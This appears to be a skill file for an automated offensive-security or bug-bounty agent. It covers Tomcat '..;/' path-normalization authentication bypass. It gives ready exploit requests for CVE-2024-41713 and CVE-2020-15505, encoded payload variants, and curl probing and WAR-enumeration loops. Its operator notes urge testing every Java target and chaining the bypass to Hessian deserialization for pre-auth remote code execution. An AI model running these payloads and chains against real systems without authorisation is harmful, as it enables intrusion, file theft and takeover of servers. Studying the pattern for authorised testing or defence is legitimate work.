---
name: tomcat-path-normalization-bypass
pattern: Tomcat Path Normalization Authentication Bypass
description: "Auto-trigger: Tomcat behind reverse proxy, ..;/ path traversal, servlet context escape, auth bypass"
tech: [tomcat, java, nginx, apache]
severity: High
triggers:
  - /scan
  - tomcat bypass
  - semicolon traversal
  - servlet context escape
  - java path normalization
related_patterns:
  - java-matrix-param-auth-bypass
  - reverse-proxy-path-confusion
  - java-hessian-deserialization
  - apache-confusion-attacks
sources:
  - "WatchTowr Labs — Mitel MiCollab (2024)"
  - "SLCyber — MobileIron (2020)"
  - "Orange Tsai — various"
---

# Tomcat Path Normalization Authentication Bypass

## Crown Jewel Targets

- Mitel MiCollab (15+ internal WARs behind `/npm-pwg/` context)
- MobileIron/Ivanti MDM (`/mifs/.;/services/` to Hessian deserialization)
- Any Java enterprise app behind Apache/Nginx reverse proxy
- Tomcat multi-WAR deployments (each WAR = potential target)
- Spring Boot apps behind load balancers (Nginx/HAProxy/F5)
- SAP/Oracle Java apps with multiple servlet contexts

## Attack Surface Signals

- JSESSIONID cookies, `.jsp`/`.do` URL extensions
- `Server: Apache-Coyote`, `Server: Apache/2.4.*` with Java backend
- Multiple application paths suggesting multi-WAR deployment
- Reverse proxy indicators: `X-Forwarded-For`, `Via`, different error pages at different paths

**Sources:** WatchTowr Labs (Mitel MiCollab, 2024), SLCyber (MobileIron, 2020), Orange Tsai (various)
**Key CVEs:** CVE-2024-41713, CVE-2020-15505

## Overview

Apache/Nginx reverse proxies and Apache Tomcat handle path normalization differently. The `..;/` sequence (semicolon as matrix parameter separator) is treated as a regular character by Apache/Nginx but normalized by Tomcat, enabling authentication bypass and servlet context escape.

## Core Technique

```
# Apache/Nginx sees: /app/..;/internal/  (no traversal detected)
# Tomcat normalizes: /internal/           (traverses out of /app/)
```

The semicolon starts a "matrix parameter" in Tomcat's URI parsing. `..;` = `..` + empty parameter.

## Exploitation Patterns

### Mitel MiCollab (CVE-2024-41713)
```
GET /npm-pwg/..;/ReconcileWizard/downloadReport HTTP/1.1
```
- Escapes `/npm-pwg/` servlet context into other WAR files
- Exposes ~15+ internal WARs never meant for unauth access
- Chain: auth bypass → ReconcileWizard → arbitrary file read

### MobileIron MDM (CVE-2020-15505)
```
GET /mifs/.;/services/someService HTTP/1.1
```
- Apache doesn't match rewrite rule for `/mifs/services/`
- Tomcat normalizes `.;` → routes to `/mifs/services/`
- Chain: ACL bypass → Hessian deserialization → RCE

## Variant Payloads

```bash
# Standard semicolon traversal
/app/..;/admin/
/app/..;x=1/admin/
/app/.;/internal/

# Double encoding
/app/..%3b/admin/
/app/%2e%2e%3b/admin/

# With fragment
/app/..;/admin/#

# Multiple traversals
/app/..;/..;/..;/admin/
```

## Detection

```bash
# Test for Tomcat behind reverse proxy
curl -sk "https://target/app/..;/WEB-INF/web.xml"
curl -sk "https://target/app/..;/" -o /dev/null -w "%{http_code}"
curl -sk "https://target/app/.;/" -o /dev/null -w "%{http_code}"

# Enumerate internal WARs
for war in axis2 admin manager ROOT internal; do
    curl -sk "https://target/app/..;/$war/" -o /dev/null -w "%{http_code} $war\n"
done
```

## Bug Bounty Relevance

- **HIGH**: Extremely common in enterprise Java applications
- Any Apache/Nginx reverse proxy + Tomcat backend is potentially affected
- Multiple WAR files in same Tomcat = larger attack surface
- Leads to: internal API access, file read, deserialization, RCE chains
- Keep testing — this pattern appears in new products every year

## Operator Notes (Battle-Tested)

- **`..;/` is the universal Java path bypass**: Apache/Nginx see it as a literal path segment. Tomcat strips the matrix parameter and normalizes the `..`. Test this on EVERY Java target.
- **Double encoding for extra bypass**: `%2e%2e%3b/` when the first layer URL-decodes before forwarding.
- **Enumerate WARs after escape**: Once you escape the context, enumerate internal WARs — `axis2`, `admin`, `manager`, `ROOT`, `internal`, `console`.
- **Chain with Hessian/deserialization**: MobileIron pattern: context escape + Hessian endpoint = pre-auth RCE. Always check for `/services/`, `/remoting/`, `/hessian/` after escape.
- **Not just Tomcat**: JBoss, WildFly, Jetty, Resin all have semicolon handling quirks. Test all Java containers.
- **This pattern recurs annually**: New CVEs every year in different products. The architectural flaw (proxy vs backend path parsing) is permanent.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `java-matrix-param-auth-bypass` | Complementary auth bypass via `;.wadl` suffix |
| `reverse-proxy-path-confusion` | General proxy confusion framework |
| `java-hessian-deserialization` | RCE after context escape to service endpoints |
| `apache-confusion-attacks` | Apache-specific confusion patterns |
| `spring-el-injection` | EL injection on reached Spring endpoints |
